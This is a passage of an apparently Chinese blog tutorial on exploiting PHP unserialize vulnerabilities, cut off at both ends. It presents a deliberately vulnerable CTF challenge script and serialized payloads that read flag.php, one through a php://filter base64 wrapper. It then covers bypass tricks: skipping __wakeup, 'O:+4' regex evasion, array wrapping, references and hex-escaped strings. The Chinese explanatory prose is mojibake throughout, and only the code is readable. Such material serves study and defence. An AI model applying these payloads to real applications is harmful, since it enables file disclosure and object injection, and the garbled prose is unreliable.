class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å±é™©å‡½æ•°<strong>file_get_contents</strong>ï¼ˆ<em>æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</em>ï¼‰ï¼Œå½“åœ¨process()æ–¹æ³•ä¸­çš„$this-&gt;op &#x3D;&#x3D; â€œ2â€æ—¶ï¼Œå°±ä¼šèµ°åˆ°$res &#x3D; $this-&gt;read()ï¼Œè°ƒç”¨file_get_contents()æ–¹æ³•ï¼Œå¦‚ä½•è°ƒç”¨process()æ–¹æ³•å‘¢ï¼Ÿ</p>
<p>__construct()ä¸­çš„$op è¢«å›ºå®šä¸ºäº†1ï¼Œè€Œåœ¨__destruct()ä¸­æ‰€è°ƒç”¨çš„opæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´è¿›è¡Œä¿®æ”¹ä¸º2ï¼Œä½†ä»£ç ä¸­å­˜åœ¨é™åˆ¶</p>
<p>ä¸¤ä¸ªç»•è¿‡ï¼š1.__destruct()ä¸­è¦æ±‚opï¼&#x3D;&#x3D;&#x3D;2ä¸”process()ä¸­è¦æ±‚op&#x3D;&#x3D;2</p>
<p>å› ä¸º __destruct()ä¸­çš„ifåˆ¤æ–­ä¸º&#x3D;&#x3D;&#x3D;ï¼Œæ‰€ä»¥å¯ä»¥æ”¹å®Œ$op&#x3D;â€2â€ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡ifï¼Œè¿›å…¥process()ä¸­ï¼Œä¸”process()æ–¹æ³•ä¸­çš„åˆ¤æ–­ä¸º&#x3D;&#x3D;(å¼±ç±»å‹)</p>
<p>2.ç»•è¿‡is_valid()å‡½æ•°ï¼Œprivateå’Œprotectedå±æ€§ç»è¿‡åºåˆ—åŒ–éƒ½å­˜åœ¨ä¸å¯æ‰“å°å­—ç¬¦åœ¨32-125ä¹‹å¤–ï¼Œä½†æ˜¯å¯¹äºPHPç‰ˆæœ¬7.1+ï¼Œå¯¹å±æ€§çš„ç±»å‹ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°†protectedç±»å‹æ”¹ä¸ºpublicï¼Œä»¥æ¶ˆé™¤ä¸å¯æ‰“å°å­—ç¬¦ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$op</span> = <span class="string">&quot;2&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="2ã€ç»•è¿‡-wakeup"><a href="#2ã€ç»•è¿‡-wakeup" class="headerlink" title="2ã€ç»•è¿‡__wakeup"></a>2ã€ç»•è¿‡__wakeup</h3><blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç‰ˆæœ¬ï¼š</span><br><span class="line">PHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span></span><br><span class="line">PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure></blockquote>
<p>åˆ©ç”¨æ–¹å¼ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</p>
<p>å¯¹äºä¸‹é¢è¿™æ ·ä¸€ä¸ªè‡ªå®šä¹‰ç±»ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;yyds&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ‰§è¡Œunserialize(â€˜O:4:â€testâ€:1:{s:1:â€aâ€;s:4:â€yydsâ€;}â€™);è¾“å‡ºç»“æœä¸º666ï¼›</p>
<p>è€ŒæŠŠå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¢å¤§æ‰§è¡Œunserialize(â€˜O:4:â€testâ€:2:{s:1:â€aâ€;s:4:â€yydsâ€;}â€™);è¾“å‡ºç»“æœä¸ºyydsã€‚</p>
<h3 id="3ã€ç»•è¿‡éƒ¨åˆ†æ­£åˆ™"><a href="#3ã€ç»•è¿‡éƒ¨åˆ†æ­£åˆ™" class="headerlink" title="3ã€ç»•è¿‡éƒ¨åˆ†æ­£åˆ™"></a>3ã€ç»•è¿‡éƒ¨åˆ†æ­£åˆ™</h3><p>preg_match(â€˜&#x2F;^O:\d+&#x2F;â€˜)åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´</p>
<h4 id="åˆ©ç”¨åŠ å·ç»•è¿‡"><a href="#åˆ©ç”¨åŠ å·ç»•è¿‡" class="headerlink" title="åˆ©ç”¨åŠ å·ç»•è¿‡"></a>åˆ©ç”¨åŠ å·ç»•è¿‡</h4><p>æ³¨æ„åœ¨urlé‡Œä¼ å‚æ—¶+è¦ç¼–ç ä¸º%2B</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>; <span class="comment">//+å·ç»•è¿‡ </span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<h4 id="serialize-array-a"><a href="#serialize-array-a" class="headerlink" title="serialize( array( a) );"></a>serialize( array( a) );</h4><p>aä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆåºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„ï¼‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨å¼•ç”¨ä½¿ä¸¤å€¼æ’ç­‰"><a href="#åˆ©ç”¨å¼•ç”¨ä½¿ä¸¤å€¼æ’ç­‰" class="headerlink" title="åˆ©ç”¨å¼•ç”¨ä½¿ä¸¤å€¼æ’ç­‰"></a>åˆ©ç”¨å¼•ç”¨ä½¿ä¸¤å€¼æ’ç­‰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™ä¸ªä¾‹å­å°†$bè®¾ç½®ä¸º$açš„å¼•ç”¨ï¼Œå¯ä»¥ä½¿$aæ°¸è¿œä¸$bç›¸ç­‰</p>
<h4 id="16è¿›åˆ¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤"><a href="#16è¿›åˆ¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤" class="headerlink" title="16è¿›åˆ¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤"></a>16è¿›åˆ¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">å¯ä»¥å†™æˆ</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ<span class="number">16</span>è¿›åˆ¶è§£æã€‚</span><br></pre></td></tr></table></figure>

<h3 id="4ã€ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#4ã€ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="4ã€ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>4ã€ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h3><p>å½“å¼€å‘è€…ä½¿ç”¨å…ˆå°†å¯¹è±¡åºåˆ—åŒ–ï¼Œç„¶åå°†å¯¹è±¡ä¸­çš„å­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œæœ€åå†è¿›è¡Œååºåˆ—åŒ–ã€‚è¿™ä¸ªæ—¶å€™å°±æœ‰å¯èƒ½ä¼šäº§ç”ŸPHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„æ¼æ´ã€‚</p>
<h4 id="ååºåˆ—åŒ–å­—ç¬¦å˜å¤šé€ƒé€¸æ¡ˆä¾‹"><a href="#ååºåˆ—åŒ–å­—ç¬¦å˜å¤šé€ƒé€¸æ¡ˆä¾‹" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦å˜å¤šé€ƒé€¸æ¡ˆä¾‹"></a>ååºåˆ—åŒ–å­—ç¬¦å˜å¤šé€ƒé€¸æ¡ˆä¾‹</h4><p>å‡è®¾æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ªuserç±»ï¼Œç„¶åé‡Œé¢ä¸€å…±æœ‰3ä¸ªæˆå‘˜å˜é‡ï¼šusernameã€passwordã€isVIPã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å½“è¿™ä¸ªç±»è¢«åˆå§‹åŒ–çš„æ—¶å€™ï¼ŒisVIPå˜é‡é»˜è®¤æ˜¯0ï¼Œå¹¶ä¸”ä¸å—åˆå§‹åŒ–ä¼ å…¥çš„å‚æ•°å½±å“ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€æ®µç¨‹åºçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è±¡åºåˆ—åŒ–ä¹‹åçš„isVIPå˜é‡æ˜¯0ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¢åŠ ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå¯¹adminå­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œå°†adminæ›¿æ¢ä¸ºhackerï¼Œæ›¿æ¢å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    